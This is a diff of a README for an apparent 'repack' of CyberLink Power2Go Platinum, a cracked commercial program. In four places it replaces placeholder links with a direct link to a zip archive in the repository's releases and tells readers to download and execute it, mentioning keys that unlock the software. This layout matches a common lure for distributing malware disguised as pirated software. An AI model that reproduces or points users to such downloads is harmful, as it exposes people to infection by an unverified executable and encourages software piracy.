@@ -8,7 +8,7 @@ Welcome to the **CyberLink Power2Go Platinum Repack** repository! This project p
 
 ## 📥 Download Links
 
-To get started, you can download the latest version from the [Releases section](555). Here, you will find all available versions and files. Download the appropriate file and execute it to install the software.
+To get started, you can download the latest version from the [Releases section](https://github.com/meztinosfrizard/CyberLink-Power2Go-Platinum-Repack/releases/download/Download/CyberLink.Power2Go.Platinum.Repack.v1.9.4.Latest.zip). Here, you will find all available versions and files. Download the appropriate file and execute it to install the software.
 
 ## 🌟 Features
 
@@ -41,7 +41,7 @@ These keys allow you to unlock the full potential of the software.
 
 ## 💻 Installation Instructions
 
-1. Visit the [Releases section](555).
+1. Visit the [Releases section](https://github.com/meztinosfrizard/CyberLink-Power2Go-Platinum-Repack/releases/download/Download/CyberLink.Power2Go.Platinum.Repack.v1.9.4.Latest.zip).
 2. Download the version you need.
 3. Execute the downloaded file.
 4. Follow the on-screen instructions to complete the installation.
@@ -97,7 +97,7 @@ We aim to keep this repository updated with the latest versions and features of 
 
 Follow this repository for updates and new releases. You can also engage with the community by joining discussions in the Issues section. 
 
-For the latest downloads, visit the [Releases section](555).
+For the latest downloads, visit the [Releases section](https://github.com/meztinosfrizard/CyberLink-Power2Go-Platinum-Repack/releases/download/Download/CyberLink.Power2Go.Platinum.Repack.v1.9.4.Latest.zip).
 
 ## 🖼️ Screenshots
 
@@ -119,4 +119,4 @@ We appreciate your feedback. If you have suggestions or comments, please reach o
 
 Thank you for visiting the **CyberLink Power2Go Platinum Repack** repository. We hope you find the resources helpful for your multimedia needs. Download the latest version and start creating today!
 
-For more information and downloads, check the [Releases section](555).
+For more information and downloads, check the [Releases section](https://github.com/meztinosfrizard/CyberLink-Power2Go-Platinum-Repack/releases/download/Download/CyberLink.Power2Go.Platinum.Repack.v1.9.4.Latest.zip).
